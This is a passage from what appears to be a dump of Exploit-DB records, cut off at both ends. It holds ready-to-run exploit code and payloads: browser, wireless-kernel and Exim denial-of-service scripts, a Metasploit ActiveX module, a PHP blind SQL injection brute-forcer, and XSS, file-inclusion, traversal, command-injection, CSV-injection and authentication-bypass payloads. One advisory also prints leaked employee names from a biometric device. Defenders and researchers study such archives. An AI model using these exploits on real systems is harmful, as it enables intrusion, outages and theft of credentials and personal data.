Apple and Opera guys at the  WHATWG social, and we decided this was a good number""  III. Impact ~~~~~~~~~ The Impact varies from Browser to Browser and from OS to OS.   Here is a small excerpt: - Konqueror (Ubuntu)- allocates 2GB of memory then either crashes  the Browser or (most often) the OS reboots. Ubuntu's memory management system appears to be configured as to NOT stop the process that consumes too much memory, but a random process. This sometimes leads to processes that are vital for the OS to be killed, hence the reboot. I am not kidding. Thanks to 'FX' for Memory management hint.  - Chrome :  allocates 2GB of memory then crashes tab with a null pointer  - Firefox : allocates 2GB of memory then the Browser crashes  - IE5,6,7,8 : allocates 2GB of memory then the Browser crashes  - Opera : Allocated and commits as much memory as available,  will not crash but other applications will become unstable   - Nintento WII (Opera) : Console hangs, needs hard reset Video: http://vimeo.com/2937101 (Thanks to David Raison)  - Sony PS3 - Console hangs, needs hard reset  Video: http://vimeo.com/2937101 (Thanks to Chris Gates)  - iPhone - iPhone hangs and needs hard reset Video: http://vimeo.com/2873339 (Thanks to g0tcha)  - Aigo P8860 (Browser hangs and cannot be restarted)     IV. Proof of concept  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ <script> function poc(o) {         e = document.createElement(""select"");         e.length=2147483647; }  function go() {         poc(0); } </script>  URL: http://www.crashthisthing.com/select.html  Some have not understood what this code does, it does NOT loop as some vendors claimed, it just calls select.lenght() ONCE with a huge integer. One might wonder if over the 9 last years that this bug existed, nobody ever entered a large  number in a select.lenght() call.  IV. Disclosure timeline ~~~~~~~~~~~~~~~~~~~~~~~ Nothing particular to note, except the usual discussion about availability being a security issue.  V. Thanks ~~~~~~~~~~~~~~~~~~~~~~~ Chris Gates, David Raison, Fahem Adam, a team of engineers that recognise themselves and oCert for not helping coordinate this bug.  # milw0rm.com [2009-07-15]",remote,dos,1
32628,"ASP Forum Script - 'messages.asp?forum_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/32571/info    ASP Forum Script is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.    Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.    http://www.example.com/[Path]/messages.asp?forum_id=>'><ScRiPt%20%0a%0d>alert(1369)%3B</ScRiPt>&message_id=197",remote,webapps,1
6733,mini-pub 0.3 - File Disclosure / Code Execution mini-pub 0.3 multiple vulnerabilities  download   http://sourceforge.net/projects/mini-pub/  author     muuratsalo contact    muuratsalo[at]gmail.com  exploits 1. local file disclosure http://localhost/mini-pub.php/front-end/img.php?sFileName=http://site.com/cmd.txt?  2. local file disclosure http://localhost/mini-pub.php/front-end/cat.php?sFileName=/etc/passwd  3. command execution http://localhost/mini-pub.php/front-end/cat.php?sFileName=a%3Benv  # milw0rm.com [2008-10-12],local,webapps,0
9442,"Linux Kernel < 2.6.30.5 - 'cfg80211' Remote Denial of Service /*  * cfg80211-remote-dos.c  *  * Linux Kernel < 2.6.30.5 cfg80211 Remote DoS  * Jon Oberheide <jon@oberheide.org>  * http://jon.oberheide.org  *   * Information:  *  *   http://patchwork.kernel.org/patch/41218/  *  *   These pointers can be NULL, the is_mesh() case isn't ever hit in the   *   current kernel, but cmp_ies() can be hit under certain conditions.  *  * Usage:  *  *   $ gcc cfg80211-remote-dos.c -o cfg80211-remote-dos -lorcon  *   $ airmon-ng start wlan0  *   ...  *   $ ./cfg80211-remote-dos mon0 mac80211  *   [+] Initializing interface mon0...  *   [+] Injecting crafted DoS beacon frames...  *  * Notes:  *  *   The NULL pointer dereference is triggered if the victim scans and receives  *   a beacon frame that does not contain a SSID IE and then receives another   *   one that does have a SSID IE.  Raw frame injection via LORCON is required   *   on the wireless interface.  This should only affect the 2.6.30 series.  */  #include <stdio.h> #include <stdlib.h> #include <stdint.h> #include <string.h> #include <time.h>  #include <tx80211.h> #include <tx80211_packet.h>  #define BEACON_NOSSID \ 	""\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff"" \ 	""\x00\x03\x52\x00\x00\x00"" \ 	""\x00\x03\x52\x00\x00\x00"" \ 	""\x30\x4b"" \ 	""\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04"" \ 	""\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"" \ 	""\x03\x01\x07"" \ 	""\x05\x04\x00\x01\x01\x00"" \ 	""\x2a\x01\x04"" \ 	""\x32\x04\x30\x48\x60\x6c"" #define BEACON_NOSSID_LEN 64  #define BEACON_SSID \ 	""\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff"" \ 	""\x00\x03\x52\x00\x00\x00"" \ 	""\x00\x03\x52\x00\x00\x00"" \ 	""\x30\x4b"" \ 	""\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04"" \ 	""\x00\x03\x44\x6f\x53"" \ 	""\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"" \ 	""\x03\x01\x07"" \ 	""\x05\x04\x00\x01\x01\x00"" \ 	""\x2a\x01\x04"" \ 	""\x32\x04\x30\x48\x60\x6c"" #define BEACON_SSID_LEN 69  void usage(char **argv) { 	int i; 	struct tx80211_cardlist *cardlist;  	printf(""Usage: %s [interface] [drivername]\n"", argv[0]);  	cardlist = tx80211_getcardlist();  	if (cardlist == NULL) { 		printf(""Error accessing supported cardlist.\n""); 	} else { 		printf(""\nSupported drivers are: ""); 		for (i = 1; i < cardlist->num_cards; i++) { 			printf(""%s "", cardlist->cardnames[i]); 		} 		printf(""\n""); 	} 	tx80211_freecardlist(cardlist); }  int main(int argc, char **argv) { 	struct tx80211 tx; 	struct tx80211_packet pkt; 	char p1[BEACON_NOSSID_LEN]; 	char p2[BEACON_SSID_LEN]; 	int ret, drivertype; 	uint8_t randbyte;  	if (argc < 3) { 		usage(argv); 		return 0; 	}  	printf(""[+] Initializing interface %s...\n"", argv[1]);  	drivertype = tx80211_resolvecard(argv[2]); 	if (drivertype == INJ_NODRIVER) { 		printf(""[-] Driver name not recognized.\n""); 		exit(1); 	}  	ret = tx80211_init(&tx, argv[1], drivertype); 	if (ret < 0) { 		printf(""[-] Error initializing %s/%s"", argv[1], argv[2]); 		exit(1); 	}  	ret = tx80211_setfunctionalmode(&tx, TX80211_FUNCMODE_INJMON); 	if (ret != 0) { 		printf(""[-] Error setting monitor mode.\n""); 		printf(""[-] %s.\n"", tx80211_geterrstr(&tx)); 		exit(1); 	}  	ret = tx80211_setchannel(&tx, 11); 	if (ret < 0) { 		printf(""[-] Error setting channel.\n""); 		printf(""[-] %s.\n"", tx80211_geterrstr(&tx)); 		exit(1); 	}  	ret = tx80211_open(&tx); 	if (ret < 0) { 		printf(""[-] Unable to open interface %s\n"", tx.ifname); 		printf(""[-] %s.\n"", tx80211_geterrstr(&tx)); 		exit(1); 	}  	srand(time(NULL));  	memcpy(p1, BEACON_NOSSID, BEACON_NOSSID_LEN); 	memcpy(p2, BEACON_SSID, BEACON_SSID_LEN); 	 	printf(""[+] Injecting crafted DoS beacon frames...\n"");  	while (1) { 		randbyte = rand() & 0xff; 		p1[15] = randbyte; 		p1[21] = randbyte; 		p2[15] = randbyte; 		p2[21] = randbyte;  		pkt.packet = p1; 		pkt.plen = BEACON_NOSSID_LEN; 		if (tx80211_txpacket(&tx, &pkt) < 0) { 			printf(""[-] Unable to transmit packet.\n""); 			printf(""[-] %s.\n"", tx80211_geterrstr(&tx)); 			exit(1); 		}  		pkt.packet = p2; 		pkt.plen = BEACON_SSID_LEN; 		if (tx80211_txpacket(&tx, &pkt) < 0) { 			printf(""[-] Unable to transmit packet.\n""); 			printf(""[-] %s.\n"", tx80211_geterrstr(&tx)); 			exit(1); 		} 	}  	tx80211_close(&tx);  	return 0; }  // milw0rm.com [2009-08-18]",remote,dos,1
15174,Tiki Wiki CMS Groupware 5.2 - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/43507/info  Tiki Wiki CMS Groupware is prone to a local file-include vulnerability and a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit the local file-include vulnerability using directory-traversal strings to view and execute local files within the context of the webserver process. Information harvested may aid in further attacks.  The attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  The following applications are vulnerable; other versions may also be affected.  1. Tiki Wiki CMS Groupware 5.2 is vulnerable 2. Tiki Wiki CMS Groupware prior to 3.8  The following example URIs are available:  Local file Include:  http://www.example.com/tiki-5.2/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini  Cross Site Scripting:  http://www.example.com/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(0)%3C/script%3E,local,webapps,0
36915,NetDecision 4.6.1 - Multiple Directory Traversal Vulnerabilities source: https://www.securityfocus.com/bid/52327/info  NetDecision is prone to multiple directory-traversal vulnerabilities because it fails to sufficiently sanitize user-supplied input.  Exploiting the issues can allow an attacker to obtain sensitive information that could aid in further attacks.  NetDecision 4.6.1 is vulnerable; other versions may also be affected.   http://www.example.com:8087/...\...\...\...\...\...\windows\system.ini http://www.example.com:8090/.../.../.../.../.../.../windows/system.ini,remote,remote,1
8828,"Arab Portal 2.2 - Authentication Bypass # Script Name : Arab portal 2.2 Remote Auth SQL Bypass Vulnerabilitiy  # Script  home : http://www.arab-portal.info/arabportal_22.zip # Exploit risk level : High # Found By : RoMaNcYxHaCkEr  [RXH]         # Written By : Sniper Code    [S.C.T - 443 ] # Our home :  WwW.Sec-Code.CoM  [Security - Codes TeaM]    +======================================================================================================================+  # Introduction About Vulne :  the Control Panel Is Depending on Session In MySQL Also By Cookies But by Default  it Is Session ...  See This Line 192 of this File [admin/aclass/admin_func.php]:           $result  = $apt->query(""SELECT sessIP from  rafia_admin_sess where  sessID='$sessID' and sessIP='$sessIP' and sess_TIME<'$expsess'"");  When You Injected The Header To Get XPL SQL Injection By Simple Injected And Success The Login In This SQL Query  # Vulne Line 192 In File [admin/aclass/admin_func.php]: :  function is_login()      {          global $apt;                   $sessID  = $this->get_sessID();          $sessIP  = $apt->ip;          $expsess = $apt->time + $this->expsess;           if($this->use_pre_ip == 1){$r_ip = explode('.',$sessIP); $sessIP = $r_ip[0].'.'.$r_ip[1].'.'.$r_ip[2];}           $result  = $apt->query(""SELECT sessIP from  rafia_admin_sess where  sessID='$sessID' and sessIP='$sessIP' and sess_TIME<'$expsess'"");           if ($apt->dbnumrows($result) > 0)          {                  $apt->query(""update rafia_admin_sess set sess_TIME='"".$apt->time.""' where  sessID='$sessID'"");                 return true;          }          else          {              return false;          }      }  we can exploit this . .  # and now the Exploit  is:  -First : Install This Tool :  https://addons.mozilla.org/en-US/firefox/addon/5948  it is [ X-Forwarded-For Spoofer tool]  You Can Inject Also Client-ip Also Is Infected In Header  -second : find site by using dork : plz use your mind ^_^  ok now Go To Admincp e.g. :  http://localhost/arabportal_22/admin/  http://sniper code/path/admin/  Then Write This Code In Tool [from Firefox ===> Tools====> X-Forwarded-for Spoofer]  put this code : '/**/union/**/select/**/0/*  And  select Enable for tool . . .  Now Refresh Twice ..and you will be In admin Control Panel ^_^  I Am Tired For Written Exploit For This Bug ...  and You Can Code It,s . .  If You Have Problem With Magic_quat  in php version Encode To URL Like This :  %27%2F%2A%2A%2F%75%6E%69%6F%6E%2F%2A%2A%2F%73%65%6C%65%63%74%2F%2A%2A%2F%30%2F%2A  and also you will be in admin control panel. . . . +================================================================================================================+  # Solution :  Protect The Admin cp By using Firewall Or Change The Login Manner :)  thats it . . .  [+] done by :sniper code and rxh . .  [+] Greetz to :             [Â»] The members in our home [  WwW.Sec-Code.CoM  - - ]            [Â»] [Snake1095 - aLwHEeD - AlH7nOOtY - aB0-3tH4b T3rR0r - HXH - -]            [Â»][MN9 - S4S-T3rr0r!sT -G0D-F4Th3r- SnIpEr_h - Cyb3R-1sT - siana - jiko - -]            [+] [members of WwW.tryag.cc/cc - -]    -==========================================[ ViVa Crazy Coderz rxh - S.C.T ]====================================-  # milw0rm.com [2009-05-29]",remote,webapps,1
45324,"Wikipedia 12.0 - Denial of Service (PoC) # Exploit Title: Wikipedia 12.0 - Denial of Service (PoC) # Date: 9/2/2018 # Author: 0xB9 # Twitter: @0xB9Sec # Contact: 0xB9[at]pm.me # Software Link: https://www.microsoft.com/en-us/p/wikipedia/9wzdncrfhwm4?activetab=pivot%3aoverviewtab # Version: 12.0 # Tested on: Windows 10  # Proof of Concept: # Run the python script, it will create a new file ""wiki.txt"" # Copy the text from the generated wiki.txt file to clipboard # Paste the text in the search bar in the top right of app # App will now crash  buffer = ""A"" * 1000 payload = buffer try:     f=open(""wiki.txt"",""w"")     print ""[+] Creating %s evil payload.."" %len(payload)     f.write(payload)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created""",local,dos,1
44795,MyBB ChangUonDyU Plugin 1.0.2 - Cross-Site Scripting # Exploit Title: MyBB ChangUonDyU Advanced Statistics Plugin v1.0.2 - Cross-Site Scripting # Date: 5/25/2018 # Author: 0xB9 # Twitter: @0xB9Sec # Contact: 0xB9[at]pm.me # Software Link: https://community.mybb.com/mods.php?action=view&pid=1125 # Version: 1.0.2 # Tested on: Ubuntu 18.04 # CVE: CVE-2018-11532   1. Description: This plugin displays advanced statistics on the index page such as latest posts with auto refresh using AJAX.      2. Proof of Concept: Create a new thread with the following payload as the title  <svg onload=alert('XSS')>  The alert will appear on the index page    3. Solution: Update to the latest release,remote,webapps,1
11822,"ZKSoftware Biometric Attendence Managnmnet Hardware[MIPS] 2 - Improper Authentication # Exploit Title: ZKSoftware Biometric Attendence managnmnet Hardware[MIPS] Improper Authentication. # Date: 20-3-2010 # Author: FB1H2S # Software Link: http://www.esslindia.com/install/eTimeTrack.zip # Version: V2 # Tested on:  # category: Remote # Code : Advisory  ################################################################################### ZKSoftware Biometric Attendence management Hardware[MIPS] Improper Authentication.  1) ZKSoftware is biometric System which uses Biometric (Fingerprints) to authenticate and manage employee details,and to organise the attendance register.  This system is widely used in many countries, but is marketed by different company depending on the country.  ZKsoftwares IP-based attendance management system with the following series ""ZK5000-ZK9000"", the system allows remote IP based management of the hardware via UDP protocol,  but with out any proper authentication.  You could custom create commands and send to UDP port 4370 of the hardwrae and download information from the system, alternatively u could download a copy of there  remote hardware management software from one of there vendors web site and use it steel data from the hardware.  Essl is the company which markets this product in India, and its website provides a free download of the management software.  2) Etimetrack software which is used to manage hardware market by ESSL uses an encryption and the encryption key is hard coded in the program.  Exploiting the issue Using Scapy   Response from a coustom made scapy packets:- ##################################################################################################### fb1h2s@fb1h2s:~$ sudo scapy [sudo] password for adminuser: /var/lib/python-support/python2.5/scapy.py:3118: Warning: 'with' will become a reserved keyword in Python 2.6 /var/lib/python-support/python2.5/scapy.py:3120: Warning: 'with' will become a reserved keyword in Python 2.6 INFO: Can't import PyX. Won't be able to use psdump() or pdfdump() Welcome to Scapy (v1.1.1 / -) >>>ip=IP(""192.168.*.*) >>>udp=UDP(sport=4371,dport=4370) >>>payload=""Coustomcommands"" >>packet=ip/udp/payload >>> sniff <function sniff at 0x9f0333c> >>sr1(packet) Begin emission: Finished to send 1 packets. You could possibly get any thing you want from the system BINGO :D  I am including a dump of the UDP communication with the hardware, and the data leakage as a reason of improper authentication.  ...........Q[...L.WU[.....f.[...Ver 6.21 Sep  4 2008.....[...~OS.....[...~OS=1...hv[...~ExtendFmt...f>[...~ExtendFmt=0...jW[...ExtendOPLog.....[...ExtendOPLog=...X.[...~Platform.....[...~Platform=ZEM500.E..Y[...H....Q[...... .[...WorkCode....r[...WorkCode=0....E[.................F[..............3....D[..............@[.............U.........d...... MMr.K.Sug........d...e......MMr. Sant.)......e...f......MMrs. Anu/@......f...g......MMr. Kris@@......g...h......MMr. Domian......h...i......MMrs. Sho`n......i...j......MMr. B. S~)......j...k......MMs. Bhag_n......k...l......MMs. NishYn......l...m......MMr. Moha.)......m...n...... MMr. ChanXn......n...o......MMrs. Ruk^n......o...p......MMr. Prad.g......p...q......MMr. Kuma\n......q...r......MMr. Dhan[n......r...s......MMr. NirmZn......s...t......MMs. Lali1@......t...u......MMs. Nave.)......u...v......MMs. Sudh.)......v...w...... MMs. Anit2@......w...x......MMs. Poon3@......x...y......MMrs. Gee=@......y...z......MMs. Vidh<@......z...{......MMrs. BanB@......{...|......MMrs. Man]n......|...}......MMr.G.ThiWn......}...~......MMs. Indi........~..........MMrs. Jot...................MMrs. Kav................... MMr. Thiy...................MMr. Prak.8.................MMs. Love.8.................MMr. Sund.8.................MMr. Kart.8.................MMs. Koma.8.................MMr. Prad.8.................MMr. ........MaheB`.................MMr. RajkC`.................MMr. NataD`.................MMr. ManoE`.................MMr. Varu<`................. MMr. Than@`.................MMr. Rich=`.................MMr. Prak>`.................MMrs.A.Us?`.................MMrs.B.KaA`.................MMs. Banu._.................MMr. Stal.@.................MMr. Chan.@.................MMr. DhanQn.................MMr. MukiRn.................MMrs. Satcn.................MMs. Gomabn.................MMr. Ramadn................. MMrs. Geeen................. Trimmed....  Current vulnerability is checked and verified with zk5000 hardware model, possibly all other versions would be vulnerable.  ##################################################################################################### # Greetz to all Darkc0de, Andhra Hackers and ICW Memebers[Indian Cyber Wrriors]                              #Thanks  : Mr bond,beenu,Wipu,GOdwinAustin,The_empty,hg_H@x0r,r45c4l,it_security,eberly,harin,manoj #Shoutz  : SMART_HAX0R,j4ckh4x0r,41w@r10r,Hackuin #Catch us at www.andhrahackers.com or www.teamicw.in",remote,remote,1
35951,"Exim ESMTP 4.80 - glibc gethostbyname Denial of Service # Exploit Title: [Exim ESMTP GHOST DoS PoC Exploit] # Date: [1/29/2015] # Exploit Author: [1N3] # Vendor Homepage: [www.exim.org] # Version: [4.80 or less] # Tested on: [debian-7-7-64b] # CVE : [2015-0235]  #!/usr/bin/python # Exim ESMTP DoS Exploit by 1N3 v20150128 # CVE-2015-0235 GHOST glibc gethostbyname buffer overflow # http://crowdshield.com # # USAGE: python ghost-smtp-dos.py <ip> <port> # # Escape character is '^]'. # 220 debian-7-7-64b ESMTP Eximonnection closed by foreign host. # # user () debian-7-7-64b:~$ dmesg # ... # [ 1715.842547] exim4[2562]: segfault at 7fabf1f0ecb8 ip 00007fabef31bd04 sp 00007fffb427d5b0 error 6 in # libc-2.13.so[7fabef2a2000+182000]  import socket import time import sys, getopt  def main(argv):     argc = len(argv)      if argc <= 1:             print ""usage: %s <host>"" % (argv[0])             sys.exit(0)      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     buffertarget = argv[1] # SET TARGET     port = argv[2] # SET PORT      print ""(--==== Exim ESMTP DoS Exploit by 1N3 - https://crowdshield.com""     print ""(--==== Sending GHOST SMTP DoS to "" + target + "":"" + port + "" with length:"" +str(len(buffer))     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)     connect=s.connect((target,int(port)))     data = s.recv(1024)     print ""CONNECTION: "" +data     s.send('HELO ' + buffer + '\r\n')     data = s.recv(1024)     print ""received: "" +data     s.send('EHLO ' + buffer + '\r\n')     data = s.recv(1024)     print ""received: "" +data     s.close()  main(sys.argv)",local,dos,1
35966,"Joomla! Component com_newssearch - SQL Injection source: https://www.securityfocus.com/bid/48698/info  The 'com_newssearch' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_newssearch&type=detail&section=2&id=15'",remote,webapps,1
36100,"X360 VideoPlayer - ActiveX Control Buffer Overflow (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::BrowserExploitServer    def initialize(info={})     super(update_info(info,       'Name'                => ""X360 VideoPlayer ActiveX Control Buffer Overflow"",       'Description'         => %q{         This module exploits a buffer overflow in the VideoPlayer.ocx ActiveX installed with the         X360 Software. By setting an overly long value to 'ConvertFile()',an attacker can overrun         a .data buffer to bypass ASLR/DEP and finally execute arbitrary code.       },       'License'             => MSF_LICENSE,       'Author'              =>         [           'Rh0',     # vulnerability discovery and exploit, all the hard work           'juan vazquez' # msf module         ],       'References'          =>         [           ['EDB', '35948'],           ['URL', 'https://rh0dev.github.io/blog/2015/fun-with-info-leaks/']         ],       'Payload'             =>         {           'Space'          => 1024,           'DisableNops'    => true,           'PrependEncoder' => stack_adjust         },       'DefaultOptions'      =>         {           'InitialAutoRunScript' => 'migrate -f'         },       'Platform'            => 'win',       'Arch'                => ARCH_X86,       'BrowserRequirements' =>         {           :source  => /script|headers/i,           :clsid   => ""{4B3476C6-185A-4D19-BB09-718B565FA67B}"",           :os_name => OperatingSystems::Match::WINDOWS,           :ua_name => Msf::HttpClients::IE,           :ua_ver  => '10.0'         },       'Targets'             =>         [           [ 'Automatic', {} ]         ],       'Privileged'          => false,       'DisclosureDate'      => ""Jan 30 2015"",       'DefaultTarget'       => 0))   end    def stack_adjust     adjust = ""\x64\xa1\x18\x00\x00\x00""  # mov eax, fs:[0x18 # get teb     adjust << ""\x83\xC0\x08""             # add eax, byte 8 # get pointer to stacklimit     adjust << ""\x8b\x20""                 # mov esp, [eax] # put esp at stacklimit     adjust << ""\x81\xC4\x30\xF8\xFF\xFF"" # add esp, -2000 # plus a little offset      adjust   end    def on_request_exploit(cli, request, target_info)     print_status(""Request: #{request.uri}"")      case request.uri     when /exploit.js/       print_status(""Sending exploit.js..."")       headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}       send_exploit_html(cli, exploit_template(cli, target_info), headers)     when /sprayer.js/       print_status(""Sending sprayer.js..."")       headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}       send_exploit_html(cli, sprayer_template(cli, target_info), headers)     when /informer.js/       print_status(""Sending informer.js..."")       headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}       send_exploit_html(cli, informer_template(cli, target_info), headers)     when /rop_builder.js/       print_status(""Sending rop_builder.js..."")       headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}       send_exploit_html(cli, rop_builder_template(cli, target_info), headers)     else       print_status(""Sending main.html..."")       headers = {'Pragma' => 'no-cache', 'Content-Type'=>'text/html'}       send_exploit_html(cli, main_template(cli, target_info), headers)     end   end    def main_template(cli, target_info)     path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'main.html')     template = ''     File.open(path, 'rb') { |f| template = strip_comments(f.read) }      return template, binding()   end    def exploit_template(cli, target_info)     shellcode = Rex::Text.to_hex(get_payload(cli, target_info))      path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'exploit.js')     template = ''     File.open(path, 'rb') { |f| template = strip_comments(f.read) }      return template, binding()   end    def sprayer_template(cli, target_info)     path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'sprayer.js')     template = ''     File.open(path, 'rb') { |f| template = strip_comments(f.read) }      return template, binding()   end    def informer_template(cli, target_info)     path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'informer.js')     template = ''     File.open(path, 'rb') { |f| template = strip_comments(f.read) }      return template, binding()   end    def rop_builder_template(cli, target_info)     path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'rop_builder.js')     template = ''     File.open(path, 'rb') { |f| template = strip_comments(f.read) }      return template, binding()   end    def strip_comments(input)     input.gsub(/\/\/.*$/, '')   end  end",remote,remote,1
45643,"Oracle Siebel CRM 8.1.1 - CSV Injection # Exploit Title: Oracle Siebel CRM 8.1.1 - CSV Injection # Date: 2018-10-21 # Exploit Author: Sarath Nair aka AceNeon13  # Contact: @AceNeon13 # Vendor Homepage: www.oracle.com # Software Link: http://www.oracle.com/us/products/applications/siebel/siebel-crm-8-1-1-066196.html # Version: Oracle Siebel CRM Version 8.1.1 and below  # PoC Exploit: CSV Injection # Vulnerable URL: All CSV Export functionalities within the CRM application # Description: Siebel CRM application was found to be vulnerable to Excel Macro injection vulnerability,  # in places where user input is allowed (in text form) and the input can then be exported in CSV  # form. An attacker can change user information to include in his input a malicious excel function.   =-2+3+cmd|' /C calc'!D  # The function will then be executed on the victim’s machine,  # once the victim exports the details in CSV format and opens the exported file in Microsoft Excel.  # Impact: The vulnerability doesn’t target the web application but rather its users.  # A hypothetical attacker could use it, in order to trick other application users into unwillingly  # executing arbitrary malicious code, potentially leading to full a compromise of their workstation.  # Although excel has implemented certain features to protect its users  # (the user is asked whether he wants to execute a potentially harmful external script),  # the user could easily assume that the content can be trusted since the file is  # extracted from a trusted source.  # Solution: Disable CSV export in all list applets and where CSV export is available.  # https://docs.oracle.com/cd/E95904_01/books/Secur/siebel-security-hardening.html#c_Patch_Management_ai1029938a  ######################################## # Vulnerability Disclosure Timeline:  2017-November-20: Discovered vulnerability 2017-November-23: Vendor Notification 2017-November-29: Vendor Response/Feedback 2018-October-04: Vendor Fix/Patch/Workaround 2018-October-21: Public Disclosure ########################################  Warm regards, Sarath Nair",remote,webapps,1
37255,"Pandora FMS 5.0/5.1 - Authentication Bypass # Exploit Title: Authentication Bypass in Pandora FMS # Google Dork: 	intitle:""Pandora FMS - The Flexible Monitoring System"" 	intitle:""Pandora FMS - el Sistema Flexible de Monitorización"" # Date: 10/06/2015 # Exploit Author: Manuel Mancera (sinkmanu)    |    mmancera (at) a2secure (dot) com # Vendor Homepage: http://pandorafms.com/ <http://pandorafms.com/> # Software Link: http://pandorafms.com/ <http://pandorafms.com/> # Version: 5.0, 5.1 # Vulnerability Type : Authentication Bypass # Severity : High   ### Description ###  A vulnerability has been discovered in Pandora FMS that permits an unautheticated user to change the password for any Pandora user without knowing the actual user password. The vulnerability occurs at the login screen due to the session not being checked before the password is changed.   ### Proof of Concept ###  URL: /index.php Method: POST Payload: renew_password=1&login=admin Payload2: renew_password=1&login=admin&password_new=newpass&password_confirm=newpass   ### Exploit ###  curl -d ""renew_password=1&login=admin&password_new=newpass&password_confirm=newpass"" http://localhost/index.php <http://localhost/index.php>   ### Solution ###  Apply the latest patches available at the vendor website.    #################################################################### Disclaimer -------------------- All information is provided without warranty. The intent is to provide information to secure infrastructure and/or systems, not to be able to attack or damage. Therefore A2Secure shall not be liable for any direct or indirect damages that might be caused by using this information.  ####################################################################",remote,webapps,1
7559,"CMS NetCat 3.12 - 'password_recovery.php' Blind SQL Injection <?  /* 	NetCat Blind SQL Injection exploit by s4avrd0w [s4avrd0w@p0c.ru] 	Versions affected 3.12  	More info: http://www.netcat.ru/  	* tested on version 3.12  	usage:   	# ./NetCat_blind_SQL_exploit.php -s=NetCat_server -u=User_ID  	The options are required: 	 -u The user identifier (number in table) 	 -s Target for exploiting  	example:  	# ./NetCat_blind_SQL_exploit.php -s=http://localhost/netcat/ -u=2  	[+] Phase 1 brute login. 	[+] Brute 1 symbol... 	...........a 	[+] Brute 2 symbol... 	..............d 	[+] Brute 3 symbol... 	.......................m 	[+] Brute 4 symbol... 	...................i 	[+] Brute 5 symbol... 	........................n 	[+] Brute 6 symbol... 	..................................... 	[+] Phase 1 successfully finished: admin 	[+] Phase 2 brute password-hash. 	[+] Brute 1 symbol... 	* 	[+] Brute 2 symbol... 	.0 	[+] Brute 3 symbol... 	.0 	[+] Brute N symbol... 	 	<...> 	 	[+] Brute 42 symbol... 	..................................... 	[+] Phase 2 successfully finished: *00a51f3f48415c7d4e8908980d443c29c69b60c9 	 	 	[+] Exploiting is finished successfully 	[+] Login - admin 	[+] MySQL hash - *00a51f3f48415c7d4e8908980d443c29c69b60c9 	[+] Decrypt MySQL hash and login into NetCat CMS.  */   function http_connect($query) {  	global $server;  	$headers = array( 	    'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14', 	    'Referer' => $server 	);  	$res_http = new HttpRequest($server.""modules/auth/password_recovery.php?=1"".$query, HttpRequest::METH_GET); 	$res_http->addHeaders($headers);  	try { 		$response = $res_http->send()->getBody();  		if (eregi(""page_header"", $response)) 		{ 			return 1; 		} 		else 		{ 			return 0; 		}  	} catch (HttpException $exception) {  		print ""[-] Not connected""; 		exit(0);  	}  }  function brute($User_id,$table) { 	$ret_str = """";  	for ($i=1;$i<43;$i++) 	{ 		print ""[+] Brute $i symbol...\n"";  		for ($j=42;$j<123;$j++) 		{ 			$q = ""'/**/OR/**/1=if((ASCII(lower(SUBSTRING((SELECT/**/$table/**/FROM/**/USER/**/limit/**/$User_id,1),$i,1))))=$j,1,0)/*"";  			if (http_connect($q)) 			{ 				$ret_str=$ret_str.chr($j); 				print chr($j).""\n""; 				break; 			} 			print ""."";  			if ($j == 57) $j = 96; 			if ($j == 42) $j = 47;  		}  		if ($j == 123) break; 	}  	return $ret_str; }   function help_argc($script_name) { print "" usage:  # ./"".$script_name."" -s=NetCat_server -u=User_ID  The options are required:  -u The user identifier (number in table)  -s Target for exploiting  example:  # ./"".$script_name."" -s=http://localhost/netcat/ -u=1 [+] Phase 1 brute login. [+] Brute 1 symbol... ..1 [+] Brute 2 symbol... ..................................... [+] Phase 1 successfully finished: 1 [+] Phase 2 brute password-hash. [+] Brute 1 symbol... ..................................... [+] Phase 2 successfully finished:   [+] Exploiting is finished successfully [+] Login - 1 [+] MySQL hash - [+] You can login into NetCat CMS with the empty password ""; }  function successfully($login,$hash) { print ""  [+] Exploiting is finished successfully [+] Login - $login [+] MySQL hash - $hash "";  if ($hash) print ""[+] Decrypt MySQL hash and login into NetCat CMS.\n""; else print ""[+] You can login into NetCat CMS with the empty password\n"";  }  if (($argc != 3) || in_array($argv[1], array('--help', '-help', '-h', '-?'))) { 	